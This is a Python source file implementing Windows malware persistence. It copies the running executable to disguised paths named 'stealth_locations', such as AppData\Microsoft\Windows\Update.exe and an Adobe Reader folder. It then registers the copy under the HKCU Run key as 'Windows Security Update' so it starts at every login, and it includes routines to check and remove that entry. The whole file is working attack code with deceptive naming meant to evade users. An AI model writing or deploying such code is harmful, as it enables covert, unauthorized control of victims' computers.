import sys
from types import TracebackType
import winreg
import logging
import os



class WindowsPersistence:
    def __init__(self, key_name=None, file_path=None):
        self.key_name = key_name or "Windows Security Update"
        self.original_path = file_path or sys.executable
        self.installed = False
        self.logger = self._setup_logging()


        #Registry locations for persistence
        self.registry_locations = [
            {
                'hive': winreg.HKEY_CURRENT_USER,
                'path': r"Software\Microsoft\Windows\CurrentVersion\Run",
                'description': 'User login persistence'
            }
        ]




    def _setup_logging(self):
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
        return logging.getLogger(__name__)
    



    def copy_to_sys_location(self):
        try:
            stealth_locations = [
                os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Update.exe'),
                os.path.join(os.environ['APPDATA'], 'Adobe', 'Reader', 'Update.exe'),
                os.path.join(os.environ['PROGRAMDATA'], 'Microsoft', 'Windows', 'Security.exe')
            ]


            target_path = stealth_locations[0]
            os.makedirs(os.path.dirname(target_path), exist_ok=True)


            if not os.path.exists(target_path):
                import shutil
                
                shutil.copy2(self.original_path, target_path)
                self.logger.info(f"Copied to: {target_path}")
            
            return target_path
        
        except Exception as e:
            self.logger.error(f"Copy failed: {e}")

            return self.original_path
    


    def install_persistence(self):
        try:
            persistent_path = self.copy_to_sys_location()
            success_count = 0


            for location in self.registry_locations:
                if self._add_registry_entry(location['hive'], location['path'], persistent_path):
                    success_count += 1
                    self.logger.info(f"Added to {location['description']}")


            self.installed = success_count > 0
            return self.installed      

        except Exception as e:
            self.logger.error(f"Installation failed: {e}")
            return False



    def _add_registry_entry(self, hive, subkey, file_path):
        try:
            key = winreg.OpenKey(hive, subkey, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, self.key_name, 0, winreg.REG_SZ, f'"{file_path}"')  

            winreg.CloseKey(key)
            return True
        
        except WindowsError as e:
            self.logger.warning(f"Failed to add to {subkey}: {e}")
            return False
        
        except Exception as e:
            self.logger.error(f"Unexpected error: {e}")
            return False
    


    def remove_persistence(self):
        try:
            removed_count = 0

            for location in self.registry_locations:
                if self._remove_registry_entry(location['hive'], location['path']):
                    removed_count += 1
                    self.logger.info(f"Removed from {location['description']}")
            

            self.installed = removed_count == 0
            return removed_count > 0
        
        except Exception as e:
            self.logger.error(f"Removal failed: {e}")
            return False
    


    def _remove_registry_entry(self, hive, subkey):
        try:
            key = winreg.OpenKey(hive, subkey, 0, winreg.KEY_SET_VALUE)

            try:
                winreg.DeleteValue(key, self.key_name)
                winreg.CloseKey(key)
                return True
            
            except FileNotFoundError:
                winreg.CloseKey(key)
                return True
            
        except Exception as e:
            self.logger.warning(f"Failed to remove from {subkey}: {e}")
            return False



    def check_persistence(self):
        try:
            for location in self.registry_locations:
                key = winreg.OpenKey(location['hive'], location['path'], 0, winreg.KEY_READ)

                try:
                    value, reg_type = winreg.QueryValueEx(key, self.key_name)
                    winreg.CloseKey(key)

                    if os.path.exists(value.strip('"')):
                        self.logger.info(f"Persistence active in {location['description']}")
                        
                        return True
                
                except FileNotFoundError:
                    winreg.CloseKey(key)
                    continue
            

            self.logger.warning("Persistence not found in any location")

            return False
        
        except Exception as e:
            self.logger.error(f"Check failed: {e}")

            return False
    

    